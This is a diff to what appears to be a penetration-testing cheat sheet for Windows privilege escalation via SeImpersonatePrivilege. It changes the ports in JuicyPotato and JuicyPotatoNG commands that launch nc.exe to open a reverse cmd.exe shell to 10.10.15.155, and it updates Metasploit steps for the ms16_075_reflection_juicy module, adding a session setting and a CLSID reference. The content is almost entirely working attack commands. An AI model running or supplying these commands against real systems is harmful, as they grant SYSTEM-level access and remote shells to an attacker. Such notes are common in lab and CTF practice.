@@ -12,7 +12,7 @@ SeImpersonatePrivilege                  Impersonate a client after authenticatio
 #### Exploitation
 [Juicy Potato](https://github.com/antonioCoco/JuicyPotatoNG)
 ```powershell
-.\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\ProgramData\nc.exe 10.10.15.155 8443 -e cmd.exe" -t *
+.\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\ProgramData\nc.exe 10.10.15.155 4443 -e cmd.exe" -t *
 
 .\JuicyPotatoNG.exe -t * -p c:\windows\system32\cmd.exe -a "/c c:\ProgramData\nc.exe 10.10.15.155 8443 -e cmd.exe" 
 ```
@@ -29,11 +29,14 @@ SeImpersonatePrivilege                  Impersonate a client after authenticatio
 ```
 
 Meterpreter
+Find [CLSID](https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md)
 ```bash
 background
-use exploit/windows/local/ms16_075_reflection
+use exploit/windows/local/ms16_075_reflection_juicy
 set LHOST tun0
-set LPORT 1738        
+set LPORT 4443
+set sessions 1
+
 exploit
 
 load incognito
